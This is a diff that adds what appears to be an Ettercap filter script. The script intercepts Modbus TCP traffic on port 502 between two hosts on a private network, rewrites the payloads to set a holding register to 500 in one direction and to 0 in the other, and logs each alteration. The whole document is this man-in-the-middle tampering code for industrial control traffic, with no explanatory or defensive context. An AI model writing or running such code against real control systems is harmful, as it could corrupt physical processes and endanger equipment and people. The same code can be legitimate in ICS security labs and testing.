@@ -1,0 +1,13 @@
+if (ip.src == '192.168.1.11' && ip.dst == '192.168.1.13' && tcp.dst == 502) {
+    if (search(DATA.data, "\x00\x03\x00\x00\x00\x01")) {
+        replace("\x00\x03\x00\x00\x00\x01", "\x00\x03\x00\x00\x00\x01\x01\xf4");
+        msg("Modbus holding register set to 500 for 192.168.1.11 -> 192.168.1.13\n");
+    }
+}
+
+if (ip.src == '192.168.1.13' && ip.dst == '192.168.1.11' && tcp.dst == 502) {
+    if (search(DATA.data, "\x00\x03\x00\x00\x00\x01")) {
+        replace("\x00\x03\x00\x00\x00\x01", "\x00\x03\x00\x00\x00\x01\x00\x00");
+        msg("Modbus holding register set to 0 for 192.168.1.13 -> 192.168.1.11\n");
+    }
+}
